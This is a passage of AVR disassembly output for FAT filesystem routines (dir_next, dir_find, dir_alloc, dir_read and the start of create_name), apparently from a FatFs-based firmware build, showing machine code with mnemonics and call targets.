    22da:	af 90       	pop	r10
    22dc:	9f 90       	pop	r9
    22de:	8f 90       	pop	r8
    22e0:	08 95       	ret

000022e2 <dir_next>:
    22e2:	4f 92       	push	r4
    22e4:	5f 92       	push	r5
    22e6:	6f 92       	push	r6
    22e8:	7f 92       	push	r7
    22ea:	af 92       	push	r10
    22ec:	bf 92       	push	r11
    22ee:	cf 92       	push	r12
    22f0:	df 92       	push	r13
    22f2:	ef 92       	push	r14
    22f4:	ff 92       	push	r15
    22f6:	0f 93       	push	r16
    22f8:	1f 93       	push	r17
    22fa:	cf 93       	push	r28
    22fc:	df 93       	push	r29
    22fe:	fc 01       	movw	r30, r24
    2300:	c0 81       	ld	r28, Z
    2302:	d1 81       	ldd	r29, Z+1	; 0x01
    2304:	c6 84       	ldd	r12, Z+14	; 0x0e
    2306:	d7 84       	ldd	r13, Z+15	; 0x0f
    2308:	e0 88       	ldd	r14, Z+16	; 0x10
    230a:	f1 88       	ldd	r15, Z+17	; 0x11
    230c:	80 e2       	ldi	r24, 0x20	; 32
    230e:	c8 0e       	add	r12, r24
    2310:	d1 1c       	adc	r13, r1
    2312:	e1 1c       	adc	r14, r1
    2314:	f1 1c       	adc	r15, r1
    2316:	c1 14       	cp	r12, r1
    2318:	d1 04       	cpc	r13, r1
    231a:	80 e2       	ldi	r24, 0x20	; 32
    231c:	e8 06       	cpc	r14, r24
    231e:	f1 04       	cpc	r15, r1
    2320:	20 f0       	brcs	.+8      	; 0x232a <dir_next+0x48>
    2322:	16 8a       	std	Z+22, r1	; 0x16
    2324:	17 8a       	std	Z+23, r1	; 0x17
    2326:	10 8e       	std	Z+24, r1	; 0x18
    2328:	11 8e       	std	Z+25, r1	; 0x19
    232a:	86 89       	ldd	r24, Z+22	; 0x16
    232c:	97 89       	ldd	r25, Z+23	; 0x17
    232e:	a0 8d       	ldd	r26, Z+24	; 0x18
    2330:	b1 8d       	ldd	r27, Z+25	; 0x19
    2332:	00 97       	sbiw	r24, 0x00	; 0
    2334:	a1 05       	cpc	r26, r1
    2336:	b1 05       	cpc	r27, r1
    2338:	09 f4       	brne	.+2      	; 0x233c <dir_next+0x5a>
    233a:	b0 c0       	rjmp	.+352    	; 0x249c <dir_next+0x1ba>
    233c:	8b 01       	movw	r16, r22
    233e:	5f 01       	movw	r10, r30
    2340:	b7 01       	movw	r22, r14
    2342:	a6 01       	movw	r20, r12
    2344:	51 70       	andi	r21, 0x01	; 1
    2346:	66 27       	eor	r22, r22
    2348:	77 27       	eor	r23, r23
    234a:	45 2b       	or	r20, r21
    234c:	46 2b       	or	r20, r22
    234e:	47 2b       	or	r20, r23
    2350:	09 f0       	breq	.+2      	; 0x2354 <dir_next+0x72>
    2352:	95 c0       	rjmp	.+298    	; 0x247e <dir_next+0x19c>
    2354:	01 96       	adiw	r24, 0x01	; 1
    2356:	a1 1d       	adc	r26, r1
    2358:	b1 1d       	adc	r27, r1
    235a:	86 8b       	std	Z+22, r24	; 0x16
    235c:	97 8b       	std	Z+23, r25	; 0x17
    235e:	a0 8f       	std	Z+24, r26	; 0x18
    2360:	b1 8f       	std	Z+25, r27	; 0x19
    2362:	42 89       	ldd	r20, Z+18	; 0x12
    2364:	53 89       	ldd	r21, Z+19	; 0x13
    2366:	64 89       	ldd	r22, Z+20	; 0x14
    2368:	75 89       	ldd	r23, Z+21	; 0x15
    236a:	41 15       	cp	r20, r1
    236c:	51 05       	cpc	r21, r1
    236e:	61 05       	cpc	r22, r1
    2370:	71 05       	cpc	r23, r1
    2372:	d1 f4       	brne	.+52     	; 0x23a8 <dir_next+0xc6>
    2374:	8f 81       	ldd	r24, Y+7	; 0x07
    2376:	98 85       	ldd	r25, Y+8	; 0x08
    2378:	a0 e0       	ldi	r26, 0x00	; 0
    237a:	b0 e0       	ldi	r27, 0x00	; 0
    237c:	b7 01       	movw	r22, r14
    237e:	a6 01       	movw	r20, r12
    2380:	68 94       	set
    2382:	14 f8       	bld	r1, 4
    2384:	76 95       	lsr	r23
    2386:	67 95       	ror	r22
    2388:	57 95       	ror	r21
    238a:	47 95       	ror	r20
    238c:	16 94       	lsr	r1
    238e:	d1 f7       	brne	.-12     	; 0x2384 <dir_next+0xa2>
    2390:	48 17       	cp	r20, r24
    2392:	59 07       	cpc	r21, r25
    2394:	6a 07       	cpc	r22, r26
    2396:	7b 07       	cpc	r23, r27
    2398:	08 f4       	brcc	.+2      	; 0x239c <dir_next+0xba>
    239a:	71 c0       	rjmp	.+226    	; 0x247e <dir_next+0x19c>
    239c:	16 8a       	std	Z+22, r1	; 0x16
    239e:	17 8a       	std	Z+23, r1	; 0x17
    23a0:	10 8e       	std	Z+24, r1	; 0x18
    23a2:	11 8e       	std	Z+25, r1	; 0x19
    23a4:	84 e0       	ldi	r24, 0x04	; 4
    23a6:	87 c0       	rjmp	.+270    	; 0x24b6 <dir_next+0x1d4>
    23a8:	89 85       	ldd	r24, Y+9	; 0x09
    23aa:	9a 85       	ldd	r25, Y+10	; 0x0a
    23ac:	01 97       	sbiw	r24, 0x01	; 1
    23ae:	2c 01       	movw	r4, r24
    23b0:	61 2c       	mov	r6, r1
    23b2:	71 2c       	mov	r7, r1
    23b4:	d7 01       	movw	r26, r14
    23b6:	c6 01       	movw	r24, r12
    23b8:	07 2e       	mov	r0, r23
    23ba:	79 e0       	ldi	r23, 0x09	; 9
    23bc:	b6 95       	lsr	r27
    23be:	a7 95       	ror	r26
    23c0:	97 95       	ror	r25
    23c2:	87 95       	ror	r24
    23c4:	7a 95       	dec	r23
    23c6:	d1 f7       	brne	.-12     	; 0x23bc <dir_next+0xda>
    23c8:	70 2d       	mov	r23, r0
    23ca:	84 21       	and	r24, r4
    23cc:	95 21       	and	r25, r5
    23ce:	a6 21       	and	r26, r6
    23d0:	b7 21       	and	r27, r7
    23d2:	89 2b       	or	r24, r25
    23d4:	8a 2b       	or	r24, r26
    23d6:	8b 2b       	or	r24, r27
    23d8:	09 f0       	breq	.+2      	; 0x23dc <dir_next+0xfa>
    23da:	51 c0       	rjmp	.+162    	; 0x247e <dir_next+0x19c>
    23dc:	cf 01       	movw	r24, r30
    23de:	6d db       	rcall	.-2342   	; 0x1aba <get_fat>
    23e0:	2b 01       	movw	r4, r22
    23e2:	3c 01       	movw	r6, r24
    23e4:	62 30       	cpi	r22, 0x02	; 2
    23e6:	71 05       	cpc	r23, r1
    23e8:	81 05       	cpc	r24, r1
    23ea:	91 05       	cpc	r25, r1
    23ec:	08 f4       	brcc	.+2      	; 0x23f0 <dir_next+0x10e>
    23ee:	58 c0       	rjmp	.+176    	; 0x24a0 <dir_next+0x1be>
    23f0:	8f ef       	ldi	r24, 0xFF	; 255
    23f2:	48 16       	cp	r4, r24
    23f4:	58 06       	cpc	r5, r24
    23f6:	68 06       	cpc	r6, r24
    23f8:	78 06       	cpc	r7, r24
    23fa:	09 f4       	brne	.+2      	; 0x23fe <dir_next+0x11c>
    23fc:	53 c0       	rjmp	.+166    	; 0x24a4 <dir_next+0x1c2>
    23fe:	8f 89       	ldd	r24, Y+23	; 0x17
    2400:	98 8d       	ldd	r25, Y+24	; 0x18
    2402:	a9 8d       	ldd	r26, Y+25	; 0x19
    2404:	ba 8d       	ldd	r27, Y+26	; 0x1a
    2406:	48 16       	cp	r4, r24
    2408:	59 06       	cpc	r5, r25
    240a:	6a 06       	cpc	r6, r26
    240c:	7b 06       	cpc	r7, r27
    240e:	40 f1       	brcs	.+80     	; 0x2460 <dir_next+0x17e>
    2410:	01 2b       	or	r16, r17
    2412:	39 f4       	brne	.+14     	; 0x2422 <dir_next+0x140>
    2414:	f5 01       	movw	r30, r10
    2416:	16 8a       	std	Z+22, r1	; 0x16
    2418:	17 8a       	std	Z+23, r1	; 0x17
    241a:	10 8e       	std	Z+24, r1	; 0x18
    241c:	11 8e       	std	Z+25, r1	; 0x19
    241e:	84 e0       	ldi	r24, 0x04	; 4
    2420:	4a c0       	rjmp	.+148    	; 0x24b6 <dir_next+0x1d4>
    2422:	f5 01       	movw	r30, r10
    2424:	42 89       	ldd	r20, Z+18	; 0x12
    2426:	53 89       	ldd	r21, Z+19	; 0x13
    2428:	64 89       	ldd	r22, Z+20	; 0x14
    242a:	75 89       	ldd	r23, Z+21	; 0x15
    242c:	c5 01       	movw	r24, r10
    242e:	05 dd       	rcall	.-1526   	; 0x1e3a <create_chain>
    2430:	2b 01       	movw	r4, r22
    2432:	3c 01       	movw	r6, r24
    2434:	61 15       	cp	r22, r1
    2436:	71 05       	cpc	r23, r1
    2438:	81 05       	cpc	r24, r1
    243a:	91 05       	cpc	r25, r1
    243c:	a9 f1       	breq	.+106    	; 0x24a8 <dir_next+0x1c6>
    243e:	61 30       	cpi	r22, 0x01	; 1
    2440:	71 05       	cpc	r23, r1
    2442:	81 05       	cpc	r24, r1
    2444:	91 05       	cpc	r25, r1
    2446:	91 f1       	breq	.+100    	; 0x24ac <dir_next+0x1ca>
    2448:	8f ef       	ldi	r24, 0xFF	; 255
    244a:	48 16       	cp	r4, r24
    244c:	58 06       	cpc	r5, r24
    244e:	68 06       	cpc	r6, r24
    2450:	78 06       	cpc	r7, r24
    2452:	71 f1       	breq	.+92     	; 0x24b0 <dir_next+0x1ce>
    2454:	b3 01       	movw	r22, r6
    2456:	a2 01       	movw	r20, r4
    2458:	ce 01       	movw	r24, r28
    245a:	e9 de       	rcall	.-558    	; 0x222e <dir_clear>
    245c:	81 11       	cpse	r24, r1
    245e:	2a c0       	rjmp	.+84     	; 0x24b4 <dir_next+0x1d2>
    2460:	f5 01       	movw	r30, r10
    2462:	42 8a       	std	Z+18, r4	; 0x12
    2464:	53 8a       	std	Z+19, r5	; 0x13
    2466:	64 8a       	std	Z+20, r6	; 0x14
    2468:	75 8a       	std	Z+21, r7	; 0x15
    246a:	b3 01       	movw	r22, r6
    246c:	a2 01       	movw	r20, r4
    246e:	ce 01       	movw	r24, r28
    2470:	0e 94 28 07 	call	0xe50	; 0xe50 <clst2sect>
    2474:	f5 01       	movw	r30, r10
    2476:	66 8b       	std	Z+22, r22	; 0x16
    2478:	77 8b       	std	Z+23, r23	; 0x17
    247a:	80 8f       	std	Z+24, r24	; 0x18
    247c:	91 8f       	std	Z+25, r25	; 0x19
    247e:	f5 01       	movw	r30, r10
    2480:	c6 86       	std	Z+14, r12	; 0x0e
    2482:	d7 86       	std	Z+15, r13	; 0x0f
    2484:	e0 8a       	std	Z+16, r14	; 0x10
    2486:	f1 8a       	std	Z+17, r15	; 0x11
    2488:	e3 96       	adiw	r28, 0x33	; 51
    248a:	f1 e0       	ldi	r31, 0x01	; 1
    248c:	df 22       	and	r13, r31
    248e:	cc 0e       	add	r12, r28
    2490:	dd 1e       	adc	r13, r29
    2492:	f5 01       	movw	r30, r10
    2494:	d3 8e       	std	Z+27, r13	; 0x1b
    2496:	c2 8e       	std	Z+26, r12	; 0x1a
    2498:	80 e0       	ldi	r24, 0x00	; 0
    249a:	0d c0       	rjmp	.+26     	; 0x24b6 <dir_next+0x1d4>
    249c:	84 e0       	ldi	r24, 0x04	; 4
    249e:	0b c0       	rjmp	.+22     	; 0x24b6 <dir_next+0x1d4>
    24a0:	82 e0       	ldi	r24, 0x02	; 2
    24a2:	09 c0       	rjmp	.+18     	; 0x24b6 <dir_next+0x1d4>
    24a4:	81 e0       	ldi	r24, 0x01	; 1
    24a6:	07 c0       	rjmp	.+14     	; 0x24b6 <dir_next+0x1d4>
    24a8:	87 e0       	ldi	r24, 0x07	; 7
    24aa:	05 c0       	rjmp	.+10     	; 0x24b6 <dir_next+0x1d4>
    24ac:	82 e0       	ldi	r24, 0x02	; 2
    24ae:	03 c0       	rjmp	.+6      	; 0x24b6 <dir_next+0x1d4>
    24b0:	81 e0       	ldi	r24, 0x01	; 1
    24b2:	01 c0       	rjmp	.+2      	; 0x24b6 <dir_next+0x1d4>
    24b4:	81 e0       	ldi	r24, 0x01	; 1
    24b6:	df 91       	pop	r29
    24b8:	cf 91       	pop	r28
    24ba:	1f 91       	pop	r17
    24bc:	0f 91       	pop	r16
    24be:	ff 90       	pop	r15
    24c0:	ef 90       	pop	r14
    24c2:	df 90       	pop	r13
    24c4:	cf 90       	pop	r12
    24c6:	bf 90       	pop	r11
    24c8:	af 90       	pop	r10
    24ca:	7f 90       	pop	r7
    24cc:	6f 90       	pop	r6
    24ce:	5f 90       	pop	r5
    24d0:	4f 90       	pop	r4
    24d2:	08 95       	ret

000024d4 <dir_find>:
    24d4:	ef 92       	push	r14
    24d6:	ff 92       	push	r15
    24d8:	1f 93       	push	r17
    24da:	cf 93       	push	r28
    24dc:	df 93       	push	r29
    24de:	ec 01       	movw	r28, r24
    24e0:	e8 80       	ld	r14, Y
    24e2:	f9 80       	ldd	r15, Y+1	; 0x01
    24e4:	40 e0       	ldi	r20, 0x00	; 0
    24e6:	50 e0       	ldi	r21, 0x00	; 0
    24e8:	ba 01       	movw	r22, r20
    24ea:	c3 db       	rcall	.-2170   	; 0x1c72 <dir_sdi>
    24ec:	81 11       	cpse	r24, r1
    24ee:	2a c0       	rjmp	.+84     	; 0x2544 <dir_find+0x70>
    24f0:	4e 89       	ldd	r20, Y+22	; 0x16
    24f2:	5f 89       	ldd	r21, Y+23	; 0x17
    24f4:	68 8d       	ldd	r22, Y+24	; 0x18
    24f6:	79 8d       	ldd	r23, Y+25	; 0x19
    24f8:	c7 01       	movw	r24, r14
    24fa:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    24fe:	18 2f       	mov	r17, r24
    2500:	81 11       	cpse	r24, r1
    2502:	1c c0       	rjmp	.+56     	; 0x253c <dir_find+0x68>
    2504:	ea 8d       	ldd	r30, Y+26	; 0x1a
    2506:	fb 8d       	ldd	r31, Y+27	; 0x1b
    2508:	80 81       	ld	r24, Z
    250a:	88 23       	and	r24, r24
    250c:	c1 f0       	breq	.+48     	; 0x253e <dir_find+0x6a>
    250e:	83 85       	ldd	r24, Z+11	; 0x0b
    2510:	8f 73       	andi	r24, 0x3F	; 63
    2512:	8c 83       	std	Y+4, r24	; 0x04
    2514:	83 85       	ldd	r24, Z+11	; 0x0b
    2516:	83 fd       	sbrc	r24, 3
    2518:	0a c0       	rjmp	.+20     	; 0x252e <dir_find+0x5a>
    251a:	4b e0       	ldi	r20, 0x0B	; 11
    251c:	50 e0       	ldi	r21, 0x00	; 0
    251e:	be 01       	movw	r22, r28
    2520:	64 5e       	subi	r22, 0xE4	; 228
    2522:	7f 4f       	sbci	r23, 0xFF	; 255
    2524:	cf 01       	movw	r24, r30
    2526:	0e 94 ff 38 	call	0x71fe	; 0x71fe <memcmp>
    252a:	89 2b       	or	r24, r25
    252c:	51 f0       	breq	.+20     	; 0x2542 <dir_find+0x6e>
    252e:	60 e0       	ldi	r22, 0x00	; 0
    2530:	70 e0       	ldi	r23, 0x00	; 0
    2532:	ce 01       	movw	r24, r28
    2534:	d6 de       	rcall	.-596    	; 0x22e2 <dir_next>
    2536:	88 23       	and	r24, r24
    2538:	d9 f2       	breq	.-74     	; 0x24f0 <dir_find+0x1c>
    253a:	04 c0       	rjmp	.+8      	; 0x2544 <dir_find+0x70>
    253c:	03 c0       	rjmp	.+6      	; 0x2544 <dir_find+0x70>
    253e:	84 e0       	ldi	r24, 0x04	; 4
    2540:	01 c0       	rjmp	.+2      	; 0x2544 <dir_find+0x70>
    2542:	81 2f       	mov	r24, r17
    2544:	df 91       	pop	r29
    2546:	cf 91       	pop	r28
    2548:	1f 91       	pop	r17
    254a:	ff 90       	pop	r15
    254c:	ef 90       	pop	r14
    254e:	08 95       	ret

00002550 <dir_alloc>:
    2550:	cf 92       	push	r12
    2552:	df 92       	push	r13
    2554:	ef 92       	push	r14
    2556:	ff 92       	push	r15
    2558:	0f 93       	push	r16
    255a:	1f 93       	push	r17
    255c:	cf 93       	push	r28
    255e:	df 93       	push	r29
    2560:	ec 01       	movw	r28, r24
    2562:	6b 01       	movw	r12, r22
    2564:	e8 80       	ld	r14, Y
    2566:	f9 80       	ldd	r15, Y+1	; 0x01
    2568:	40 e0       	ldi	r20, 0x00	; 0
    256a:	50 e0       	ldi	r21, 0x00	; 0
    256c:	ba 01       	movw	r22, r20
    256e:	81 db       	rcall	.-2302   	; 0x1c72 <dir_sdi>
    2570:	81 11       	cpse	r24, r1
    2572:	20 c0       	rjmp	.+64     	; 0x25b4 <dir_alloc+0x64>
    2574:	00 e0       	ldi	r16, 0x00	; 0
    2576:	10 e0       	ldi	r17, 0x00	; 0
    2578:	4e 89       	ldd	r20, Y+22	; 0x16
    257a:	5f 89       	ldd	r21, Y+23	; 0x17
    257c:	68 8d       	ldd	r22, Y+24	; 0x18
    257e:	79 8d       	ldd	r23, Y+25	; 0x19
    2580:	c7 01       	movw	r24, r14
    2582:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    2586:	81 11       	cpse	r24, r1
    2588:	15 c0       	rjmp	.+42     	; 0x25b4 <dir_alloc+0x64>
    258a:	ea 8d       	ldd	r30, Y+26	; 0x1a
    258c:	fb 8d       	ldd	r31, Y+27	; 0x1b
    258e:	90 81       	ld	r25, Z
    2590:	95 3e       	cpi	r25, 0xE5	; 229
    2592:	11 f0       	breq	.+4      	; 0x2598 <dir_alloc+0x48>
    2594:	91 11       	cpse	r25, r1
    2596:	06 c0       	rjmp	.+12     	; 0x25a4 <dir_alloc+0x54>
    2598:	0f 5f       	subi	r16, 0xFF	; 255
    259a:	1f 4f       	sbci	r17, 0xFF	; 255
    259c:	0c 15       	cp	r16, r12
    259e:	1d 05       	cpc	r17, r13
    25a0:	19 f4       	brne	.+6      	; 0x25a8 <dir_alloc+0x58>
    25a2:	08 c0       	rjmp	.+16     	; 0x25b4 <dir_alloc+0x64>
    25a4:	00 e0       	ldi	r16, 0x00	; 0
    25a6:	10 e0       	ldi	r17, 0x00	; 0
    25a8:	61 e0       	ldi	r22, 0x01	; 1
    25aa:	70 e0       	ldi	r23, 0x00	; 0
    25ac:	ce 01       	movw	r24, r28
    25ae:	99 de       	rcall	.-718    	; 0x22e2 <dir_next>
    25b0:	88 23       	and	r24, r24
    25b2:	11 f3       	breq	.-60     	; 0x2578 <dir_alloc+0x28>
    25b4:	84 30       	cpi	r24, 0x04	; 4
    25b6:	09 f4       	brne	.+2      	; 0x25ba <dir_alloc+0x6a>
    25b8:	87 e0       	ldi	r24, 0x07	; 7
    25ba:	df 91       	pop	r29
    25bc:	cf 91       	pop	r28
    25be:	1f 91       	pop	r17
    25c0:	0f 91       	pop	r16
    25c2:	ff 90       	pop	r15
    25c4:	ef 90       	pop	r14
    25c6:	df 90       	pop	r13
    25c8:	cf 90       	pop	r12
    25ca:	08 95       	ret

000025cc <dir_read>:
    25cc:	ef 92       	push	r14
    25ce:	ff 92       	push	r15
    25d0:	0f 93       	push	r16
    25d2:	1f 93       	push	r17
    25d4:	cf 93       	push	r28
    25d6:	df 93       	push	r29
    25d8:	ec 01       	movw	r28, r24
    25da:	7b 01       	movw	r14, r22
    25dc:	08 81       	ld	r16, Y
    25de:	19 81       	ldd	r17, Y+1	; 0x01
    25e0:	84 e0       	ldi	r24, 0x04	; 4
    25e2:	25 c0       	rjmp	.+74     	; 0x262e <dir_read+0x62>
    25e4:	c8 01       	movw	r24, r16
    25e6:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    25ea:	81 11       	cpse	r24, r1
    25ec:	2b c0       	rjmp	.+86     	; 0x2644 <dir_read+0x78>
    25ee:	ea 8d       	ldd	r30, Y+26	; 0x1a
    25f0:	fb 8d       	ldd	r31, Y+27	; 0x1b
    25f2:	90 81       	ld	r25, Z
    25f4:	99 23       	and	r25, r25
    25f6:	29 f1       	breq	.+74     	; 0x2642 <dir_read+0x76>
    25f8:	23 85       	ldd	r18, Z+11	; 0x0b
    25fa:	2f 73       	andi	r18, 0x3F	; 63
    25fc:	2c 83       	std	Y+4, r18	; 0x04
    25fe:	95 3e       	cpi	r25, 0xE5	; 229
    2600:	81 f0       	breq	.+32     	; 0x2622 <dir_read+0x56>
    2602:	9e 32       	cpi	r25, 0x2E	; 46
    2604:	71 f0       	breq	.+28     	; 0x2622 <dir_read+0x56>
    2606:	2f 30       	cpi	r18, 0x0F	; 15
    2608:	61 f0       	breq	.+24     	; 0x2622 <dir_read+0x56>
    260a:	30 e0       	ldi	r19, 0x00	; 0
    260c:	2f 7d       	andi	r18, 0xDF	; 223
    260e:	41 e0       	ldi	r20, 0x01	; 1
    2610:	50 e0       	ldi	r21, 0x00	; 0
    2612:	28 30       	cpi	r18, 0x08	; 8
    2614:	31 05       	cpc	r19, r1
    2616:	11 f0       	breq	.+4      	; 0x261c <dir_read+0x50>
    2618:	40 e0       	ldi	r20, 0x00	; 0
    261a:	50 e0       	ldi	r21, 0x00	; 0
    261c:	4e 15       	cp	r20, r14
    261e:	5f 05       	cpc	r21, r15
    2620:	89 f0       	breq	.+34     	; 0x2644 <dir_read+0x78>
    2622:	60 e0       	ldi	r22, 0x00	; 0
    2624:	70 e0       	ldi	r23, 0x00	; 0
    2626:	ce 01       	movw	r24, r28
    2628:	5c de       	rcall	.-840    	; 0x22e2 <dir_next>
    262a:	81 11       	cpse	r24, r1
    262c:	0b c0       	rjmp	.+22     	; 0x2644 <dir_read+0x78>
    262e:	4e 89       	ldd	r20, Y+22	; 0x16
    2630:	5f 89       	ldd	r21, Y+23	; 0x17
    2632:	68 8d       	ldd	r22, Y+24	; 0x18
    2634:	79 8d       	ldd	r23, Y+25	; 0x19
    2636:	41 15       	cp	r20, r1
    2638:	51 05       	cpc	r21, r1
    263a:	61 05       	cpc	r22, r1
    263c:	71 05       	cpc	r23, r1
    263e:	91 f6       	brne	.-92     	; 0x25e4 <dir_read+0x18>
    2640:	01 c0       	rjmp	.+2      	; 0x2644 <dir_read+0x78>
    2642:	84 e0       	ldi	r24, 0x04	; 4
    2644:	88 23       	and	r24, r24
    2646:	21 f0       	breq	.+8      	; 0x2650 <dir_read+0x84>
    2648:	1e 8a       	std	Y+22, r1	; 0x16
    264a:	1f 8a       	std	Y+23, r1	; 0x17
    264c:	18 8e       	std	Y+24, r1	; 0x18
    264e:	19 8e       	std	Y+25, r1	; 0x19
    2650:	df 91       	pop	r29
    2652:	cf 91       	pop	r28
    2654:	1f 91       	pop	r17
    2656:	0f 91       	pop	r16
    2658:	ff 90       	pop	r15
    265a:	ef 90       	pop	r14
    265c:	08 95       	ret

0000265e <create_name>:
    265e:	3f 92       	push	r3
    2660:	4f 92       	push	r4
    2662:	5f 92       	push	r5
    2664:	6f 92       	push	r6
    2666:	7f 92       	push	r7
    2668:	8f 92       	push	r8
    266a:	9f 92       	push	r9
    266c:	af 92       	push	r10
    266e:	bf 92       	push	r11
    2670:	cf 92       	push	r12
    2672:	df 92       	push	r13
    2674:	ef 92       	push	r14
    2676:	ff 92       	push	r15
    2678:	0f 93       	push	r16
    267a:	1f 93       	push	r17
    267c:	cf 93       	push	r28
    267e:	df 93       	push	r29
    2680:	3c 01       	movw	r6, r24
    2682:	2b 01       	movw	r4, r22
    2684:	fb 01       	movw	r30, r22
    2686:	c0 81       	ld	r28, Z
    2688:	d1 81       	ldd	r29, Z+1	; 0x01
    268a:	5c 01       	movw	r10, r24
    268c:	fc e1       	ldi	r31, 0x1C	; 28
    268e:	af 0e       	add	r10, r31
    2690:	b1 1c       	adc	r11, r1
    2692:	4b e0       	ldi	r20, 0x0B	; 11
    2694:	50 e0       	ldi	r21, 0x00	; 0
    2696:	60 e2       	ldi	r22, 0x20	; 32
    2698:	70 e0       	ldi	r23, 0x00	; 0
    269a:	c5 01       	movw	r24, r10
    269c:	0e 94 15 39 	call	0x722a	; 0x722a <memset>
    26a0:	88 81       	ld	r24, Y
    26a2:	8e 32       	cpi	r24, 0x2E	; 46
    26a4:	69 f5       	brne	.+90     	; 0x2700 <create_name+0xa2>
    26a6:	40 e0       	ldi	r20, 0x00	; 0
    26a8:	50 e0       	ldi	r21, 0x00	; 0
    26aa:	80 e0       	ldi	r24, 0x00	; 0
    26ac:	90 e0       	ldi	r25, 0x00	; 0
    26ae:	9c 01       	movw	r18, r24
    26b0:	2f 5f       	subi	r18, 0xFF	; 255
    26b2:	3f 4f       	sbci	r19, 0xFF	; 255
    26b4:	fe 01       	movw	r30, r28
    26b6:	e8 0f       	add	r30, r24
    26b8:	f9 1f       	adc	r31, r25
    26ba:	80 81       	ld	r24, Z
    26bc:	8e 32       	cpi	r24, 0x2E	; 46
    26be:	59 f4       	brne	.+22     	; 0x26d6 <create_name+0x78>
    26c0:	23 30       	cpi	r18, 0x03	; 3
    26c2:	31 05       	cpc	r19, r1
    26c4:	40 f4       	brcc	.+16     	; 0x26d6 <create_name+0x78>
    26c6:	f5 01       	movw	r30, r10
    26c8:	e4 0f       	add	r30, r20
    26ca:	f5 1f       	adc	r31, r21
    26cc:	80 83       	st	Z, r24
    26ce:	c9 01       	movw	r24, r18
    26d0:	4f 5f       	subi	r20, 0xFF	; 255
    26d2:	5f 4f       	sbci	r21, 0xFF	; 255
    26d4:	ec cf       	rjmp	.-40     	; 0x26ae <create_name+0x50>
    26d6:	8f 32       	cpi	r24, 0x2F	; 47
    26d8:	29 f0       	breq	.+10     	; 0x26e4 <create_name+0x86>
    26da:	8c 35       	cpi	r24, 0x5C	; 92
    26dc:	19 f0       	breq	.+6      	; 0x26e4 <create_name+0x86>
    26de:	81 32       	cpi	r24, 0x21	; 33
    26e0:	08 f0       	brcs	.+2      	; 0x26e4 <create_name+0x86>
    26e2:	a4 c0       	rjmp	.+328    	; 0x282c <create_name+0x1ce>
    26e4:	c2 0f       	add	r28, r18
    26e6:	d3 1f       	adc	r29, r19
    26e8:	f2 01       	movw	r30, r4
    26ea:	d1 83       	std	Z+1, r29	; 0x01
    26ec:	c0 83       	st	Z, r28
    26ee:	81 32       	cpi	r24, 0x21	; 33
    26f0:	10 f4       	brcc	.+4      	; 0x26f6 <create_name+0x98>
    26f2:	84 e2       	ldi	r24, 0x24	; 36
    26f4:	01 c0       	rjmp	.+2      	; 0x26f8 <create_name+0x9a>
    26f6:	80 e2       	ldi	r24, 0x20	; 32
    26f8:	f3 01       	movw	r30, r6
    26fa:	87 a3       	std	Z+39, r24	; 0x27
    26fc:	80 e0       	ldi	r24, 0x00	; 0
    26fe:	a3 c0       	rjmp	.+326    	; 0x2846 <create_name+0x1e8>
    2700:	c1 2c       	mov	r12, r1
    2702:	d1 2c       	mov	r13, r1
    2704:	e1 2c       	mov	r14, r1
    2706:	f1 2c       	mov	r15, r1
    2708:	68 94       	set
    270a:	88 24       	eor	r8, r8
    270c:	83 f8       	bld	r8, 3
    270e:	91 2c       	mov	r9, r1
    2710:	87 01       	movw	r16, r14
    2712:	0f 5f       	subi	r16, 0xFF	; 255
    2714:	1f 4f       	sbci	r17, 0xFF	; 255
    2716:	fe 01       	movw	r30, r28
    2718:	ee 0d       	add	r30, r14
    271a:	ff 1d       	adc	r31, r15
    271c:	30 80       	ld	r3, Z
    271e:	f0 e2       	ldi	r31, 0x20	; 32
    2720:	f3 15       	cp	r31, r3
    2722:	08 f0       	brcs	.+2      	; 0x2726 <create_name+0xc8>
    2724:	67 c0       	rjmp	.+206    	; 0x27f4 <create_name+0x196>
    2726:	8f e2       	ldi	r24, 0x2F	; 47
    2728:	38 16       	cp	r3, r24
    272a:	31 f0       	breq	.+12     	; 0x2738 <create_name+0xda>
    272c:	9c e5       	ldi	r25, 0x5C	; 92
    272e:	39 12       	cpse	r3, r25
    2730:	0c c0       	rjmp	.+24     	; 0x274a <create_name+0xec>
    2732:	02 c0       	rjmp	.+4      	; 0x2738 <create_name+0xda>
    2734:	0f 5f       	subi	r16, 0xFF	; 255
    2736:	1f 4f       	sbci	r17, 0xFF	; 255
    2738:	fe 01       	movw	r30, r28
    273a:	e0 0f       	add	r30, r16
    273c:	f1 1f       	adc	r31, r17
    273e:	80 81       	ld	r24, Z
    2740:	8f 32       	cpi	r24, 0x2F	; 47
    2742:	c1 f3       	breq	.-16     	; 0x2734 <create_name+0xd6>
    2744:	8c 35       	cpi	r24, 0x5C	; 92
    2746:	b1 f3       	breq	.-20     	; 0x2734 <create_name+0xd6>
    2748:	55 c0       	rjmp	.+170    	; 0x27f4 <create_name+0x196>
    274a:	ee e2       	ldi	r30, 0x2E	; 46
    274c:	3e 16       	cp	r3, r30
    274e:	19 f0       	breq	.+6      	; 0x2756 <create_name+0xf8>
    2750:	c8 14       	cp	r12, r8
    2752:	d9 04       	cpc	r13, r9
    2754:	98 f0       	brcs	.+38     	; 0x277c <create_name+0x11e>
    2756:	fb e0       	ldi	r31, 0x0B	; 11
    2758:	8f 16       	cp	r8, r31
    275a:	91 04       	cpc	r9, r1
    275c:	09 f4       	brne	.+2      	; 0x2760 <create_name+0x102>
    275e:	68 c0       	rjmp	.+208    	; 0x2830 <create_name+0x1d2>
    2760:	8e e2       	ldi	r24, 0x2E	; 46
    2762:	38 12       	cpse	r3, r24
    2764:	67 c0       	rjmp	.+206    	; 0x2834 <create_name+0x1d6>
    2766:	78 01       	movw	r14, r16
    2768:	68 94       	set
    276a:	cc 24       	eor	r12, r12
    276c:	c3 f8       	bld	r12, 3
    276e:	d1 2c       	mov	r13, r1
    2770:	0f 2e       	mov	r0, r31
    2772:	fb e0       	ldi	r31, 0x0B	; 11
    2774:	8f 2e       	mov	r8, r31
    2776:	91 2c       	mov	r9, r1
    2778:	f0 2d       	mov	r31, r0
    277a:	ca cf       	rjmp	.-108    	; 0x2710 <create_name+0xb2>
    277c:	83 2d       	mov	r24, r3
    277e:	0e 94 f8 06 	call	0xdf0	; 0xdf0 <dbc_1st>
    2782:	89 2b       	or	r24, r25
    2784:	01 f1       	breq	.+64     	; 0x27c6 <create_name+0x168>
